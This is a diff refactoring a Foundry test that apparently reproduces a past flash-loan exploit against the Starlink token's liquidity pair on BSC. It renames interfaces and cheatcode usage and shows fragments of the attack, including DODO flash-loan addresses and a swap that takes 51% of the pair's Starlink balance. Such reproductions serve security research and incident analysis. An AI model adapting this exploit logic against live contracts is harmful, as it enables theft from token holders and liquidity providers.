@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analysis
 // https://twitter.com/NumenAlert/status/1626447469361102850
@@ -14,8 +13,8 @@ contract ContractTest is Test {
 
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 Starlink = IERC20(0x518281F34dbf5B76e6cdd3908a6972E8EC49e345);
-    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-    Uni_Pair_V2 Pair = Uni_Pair_V2(0x425444dA1410940CFdfB6A980Bd16aA7a5376d6D);
+    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Pair Pair = IUniswapV2Pair(0x425444dA1410940CFdfB6A980Bd16aA7a5376d6D);
     address dodo1 = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
     address dodo2 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
     address dodo3 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
@@ -23,10 +22,8 @@ contract ContractTest is Test {
     uint256 dodoFlashAmount2;
     uint256 dodoFlashAmount3;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 25_729_304);
+        vm.createSelectFork("bsc", 25_729_304);
     }
 
     function testExploit() public {
@@ -64,7 +61,7 @@ contract ContractTest is Test {
         path[0] = address(WBNB);
         path[1] = address(Starlink);
         uint256[] memory values = Router.getAmountsOut(amountIn, path);
-        values[1] = Starlink.balanceOf(address(Pair)) * 51 / 100;
+        values[1] = (Starlink.balanceOf(address(Pair)) * 51) / 100;
         Pair.swap(values[1], 0, address(this), "");
     }
 
